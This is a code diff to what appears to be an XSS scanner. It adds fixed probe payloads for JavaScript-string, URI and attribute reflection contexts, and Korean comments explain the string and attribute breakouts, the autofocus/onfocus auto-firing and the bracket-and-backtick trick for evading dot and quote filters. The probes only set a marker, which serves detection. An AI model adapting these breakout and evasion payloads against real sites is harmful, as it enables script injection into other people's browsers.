@@ -24,6 +24,23 @@ _ATTRIBUTE_MARKER = re.compile(
     rf"^{XSS_EXECUTION_MARKER_PREFIX}attr_(data-[A-Za-z][A-Za-z0-9-]{{0,30}})_[A-Za-z0-9z]+$"
 )
 _ATTRIBUTE_NAME = re.compile(r"^data-[a-z][a-z0-9-]{0,30}$")
+# 반사 맥락 -> 그 맥락에서만 실행되는 고정 탐침 코드. marker 하나를 window slot에 쓰는
+# 것 외에 아무 일도 하지 않으며, 형태는 전부 여기에 박혀 있다. Agent도 LLM도 payload를
+# 고르지 못하고, Python이 응답에서 계산한 맥락만 어느 형태를 쓸지 결정한다.
+#
+# uri_attribute는 iframe src의 javascript: URI가 자기 프레임에서 실행되므로 상위
+# 문서의 slot에 쓴다. 다른 맥락은 문서 자신의 스크립트로 실행되어 window로 충분하다.
+_CONTEXT_CODES = {
+    "js_string_double": "jsd",
+    "js_string_single": "jss",
+    "uri_attribute": "uri",
+    "attribute_double": "atd",
+    "attribute_single": "ats",
+}
+_CONTEXT_MARKER = re.compile(
+    rf"^{XSS_EXECUTION_MARKER_PREFIX}ctx_({'|'.join(sorted(_CONTEXT_CODES.values()))})_"
+    r"[A-Za-z0-9_-]+$"
+)
 _REFLECTION_MARKER = re.compile(rf"^{XSS_REFLECTION_MARKER_PREFIX}[A-Za-z0-9_-]+$")
 _MESSAGE_TYPE = re.compile(r"^[a-z][a-z0-9_-]{0,19}(?::[a-z][a-z0-9_-]{0,19}){0,2}$")
 _MESSAGE_FIELDS = frozenset({"html", "markup", "content"})
@@ -143,6 +160,37 @@ def attribute_execution_marker(raw: str, attribute: str) -> str:
     return probe_marker(raw, prefix=f"{XSS_EXECUTION_MARKER_PREFIX}attr_{attribute}_")
 
 
+def context_execution_marker(raw: str, context: str) -> str:
+    """Bind a fixed context-specific probe to a Python-classified reflection context."""
+
+    code = _CONTEXT_CODES.get(context)
+    if code is None:
+        raise ValueError("secondary XSS context must be a classified payload context")
+    return probe_marker(raw, prefix=f"{XSS_EXECUTION_MARKER_PREFIX}ctx_{code}_")
+
+
+def _context_payload(code: str, marker: str) -> str:
+    """맥락별 고정 payload. marker만 바뀌고 나머지 형태는 바뀌지 않는다.
+
+    대입을 점 표기 대신 대괄호와 backtick으로 쓴다. 점과 따옴표를 쓰지 않으므로
+    "URL처럼 보이지 않는 점 포함 토큰을 지운다"거나 따옴표를 지우는 흔한 필터를 지나며,
+    iframe 안에서 실행되더라도 상위 문서의 slot에 쓴다 — 최상위 문서면 top === window다.
+    """
+
+    assignment = f"top[`{_WINDOW_SLOT}`]=`{marker}`"
+    if code == "jsd":
+        # var x = "...": 문자열을 닫고 대입한 뒤 남은 꼬리를 주석으로 덮는다.
+        return f'";{assignment};//'
+    if code == "jss":
+        return f"';{assignment};//"
+    if code == "uri":
+        return f"javascript:{assignment}"
+    if code == "atd":
+        # value="...": 속성을 닫고 autofocus와 onfocus를 붙여 조작 없이 발화시킨다.
+        return f'" onfocus="{assignment}" autofocus="'
+    return f"' onfocus='{assignment}' autofocus='"
+
+
 def _execution_payload(marker: str) -> str:
     """DOM 에 삽입되었을 때 실행되는 고정 payload.
 
@@ -154,6 +202,9 @@ def _execution_payload(marker: str) -> str:
     # The marker is restricted to safe identifier characters. A template
     # literal avoids the apostrophe that can break a surrounding SQL string
     # before an otherwise exploitable reflected HTML response is rendered.
+    context = _CONTEXT_MARKER.fullmatch(marker)
+    if context is not None:
+        return _context_payload(context.group(1), marker)
     script = f"<img src=x onerror=\"window.{_WINDOW_SLOT}=`{marker}`\">"
     attribute = _ATTRIBUTE_MARKER.fullmatch(marker)
     if attribute is not None:
